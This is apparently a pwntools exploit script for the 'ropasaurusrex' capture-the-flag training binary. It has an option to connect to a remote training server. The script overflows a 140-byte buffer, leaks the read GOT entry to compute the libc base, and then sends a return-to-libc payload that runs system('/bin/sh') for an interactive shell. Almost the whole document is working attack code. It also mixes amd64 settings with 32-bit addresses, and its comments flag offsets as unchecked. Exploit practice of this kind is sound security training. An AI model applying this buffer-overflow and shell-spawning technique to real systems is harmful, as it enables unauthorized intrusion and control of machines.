from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./ropasaurusrex")
        gdb.attach(p, """
        b *0x0000000000400696
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./ropasaurusrex"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 2014)
else:
    p = process("./ropasaurusrex")

libc = ELF("./libc-2.35.so")

main = p32(0x0804841d)
write = p32(0x0804830c)
read_got = p32(0x0804961c)

payload = b"A" * 140 + write + main + p32(1) + read_got + p32(4)
# call write, return address is main because we want a loop and the parameters of the write are fd, address toleak, size

p.send(payload)

leak_read = p.recv(4)
read_libc = u32(leak_read)
libc_base = read_libc - 0x10a0c0 # offset check this
print("[!] read_libc %#x" % read_libc)
print("[!] libc_base %#x" % libc_base)

libc.address = libc_base

# magic = libc_base + 0xdee03 # one_gadget, check this: we also need a rop chain to satisfy constraints....

# system = libc_base + 0x0048150
# binsh = libc_base + 0x1bd0f5
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * 140 + p32(system) + p32(0) + p32(binsh)
#                                    ^^^^^^ why this zero? because it is the return adddres after system we can put whatever we want
p.send(payload)

p.interactive()
